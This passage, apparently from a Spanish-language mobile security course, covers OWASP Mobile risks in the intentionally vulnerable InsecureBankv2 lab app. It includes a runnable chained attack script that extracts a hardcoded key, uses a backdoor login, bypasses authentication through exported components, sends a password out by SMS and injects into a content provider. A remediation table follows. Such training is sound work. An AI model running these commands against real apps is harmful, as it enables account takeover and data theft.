>   IV y el modo. Frida devolvió la contraseña en claro en memoria. No hubo ni un
>   solo control que lo impidiera; `debuggable="true"` incluso loudo facilita.
> - **M8 (Code Tampering):** desensamblar, cambiar un `if` por un `nop`,
>   reconstruir y firmar es un minuto. La app resultante va firmada por
>   `CN=Attacker` y el usuario no tiene forma de notarlo.
> - **M10 (Extraneous Functionality):** `/devlogin`, cuatro actividades
>   exportadas, un receptor que manda contraseñas por SMS, un provider sin
>   permisos y Google Wallet en un banco.
>
> **La lección:** los tres riesgos no son etiquetas sueltas, son una cadena.
> **M9** hace posible **M8**. **M8** hace que **M10** sea inútil de evitar. Y el receptor
> de SMS es la prueba: sin la clave embebida (M4) no habría exfiltración;
> sin el receptor exportado (M7/M10) no habría canal; y con `debuggable` (M9) te
> ahorras el trabajo de hookear.

**Siguiente paso:** repaso general y examen final. Para conectar esta clase con
el panorama actual, ver [`cve-2026-mobile.md`](cve-2026-mobile.md), que mapea
cada hallazgo a vulnerabilidades reales publicadas en 2026.

---

## Anexo A — Guion de ataque encadenado

Si tienes 10 minutos y quieres el efecto completo, este es el orden. Todo está
verificado por separado, así que funciona:

```bash
D="-s 172.25.208.100:5555"
U=content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers

# 1. M9 — la clave y el IV, leídos del código
grep -n 'super secret key' ~/mobile-owasp-lab/reports/jadx/InsecureBankv2/sources/com/android/insecurebankv2/CryptoClass.java

# 2. M3 — login sin contraseña, contra el backdoor de desarrollo
curl -s -X POST -d 'username=devadmin&password=x' http://127.0.0.1:8888/devlogin

# 3. M1/M7/M10 — dentro de la zona autenticada sin autenticarse
adb $D shell am force-stop com.android.insecurebankv2
adb $D shell input keyevent 3
adb $D shell am start -n com.android.insecurebankv2/.PostLogin

# 4. M4 + M7 + M10 + M6 — la contraseña en claro, por SMS, al atacante
adb $D logcat -c
adb $D shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
  --es phonenumber "+34600000000" --es newpass "ATACANTE-DICE-ESTO"
adb $D logcat -d | grep 'For the changepassword'

# 5. M2/M7 — lectura e inyección en la base de datos de la app
adb $D shell content query --uri "$U" | head -3
adb $D shell content insert --uri "$U" --bind name:s:injectado

# 6. M6 — el sistema ha dejado constancia de todo
adb $D logcat -d | grep -iE 'Successful Login|changepassword'
```

> Nota el paso 6: **logcat es un agregador de pruebas Gratis.** Casi todos los
> hallazgos de esta clase dejan rastro en `logcat` porque la app escribe con
> `Log.d` y `System.out.println`. Antes de atacar, lee los logs: te dicen qué
> hace la app.

## Anexo B — Reparación

| Riesgo | Arreglo |
|---|---|
| M4, clave embebida | `AndroidKeyStore` (hardware-backed) + `AES/GCM/NoPadding` con IV aleatorio por operación |
| M4, IV de ceros | IV aleatorio, único, del tamaño del bloque, generado por `SecureRandom` |
| M4, CBC sin autenticar | GCM da autenticación además de confidencialidad |
| M2/M4, contraseña en disco | No guardes la contraseña. Guarda un token de sesión revocable |
| M3, `/devlogin` | Endpoint fuera de producción. En producción, nunca por *nombre de usuario* |
| M3, validación solo en cliente | El servidor debe decidir. Si el cliente dice que sí, el servidor lo dice |
| M1/M7, `exported="true"` | `android:exported="false"` por defecto; si debe exportarse, con permiso `signature` |
| M1/M7, provider sin permisos | `android:readPermission` / `android:writePermission` |
| M7, receptor sin validar | Validar el origen (`getCallingPackage`) y exigir permiso |
| M6, `Log.d` / `System.out.println` | Nada sensible a `logcat`; `BuildConfig.DEBUG` como mínimo |
| M9, `debuggable="true"` | `false` en release |
| M2, `allowBackup="true"` | `false`, o `android:fullBackupContent` controlando qué se copia |
| M10, SDKs de terceros | Revisar el **manifest fusionado** tras integrar cada SDK, y fijar versiones |
| M8, firma solo-v1 | Firmar con v2 y v3 (`apksigner sign` las añade por defecto) |

> La fila de SDKs de terceros no es teórica: hay casos publicados en 2026 de
> SDKs que añaden al manifest fusionado un componente exportado con redirección
> de intents, sin que nadie en el equipo del banco lo notara. Ver
> [`cve-2026-mobile.md`](cve-2026-mobile.md), sección «Cadena de suministro».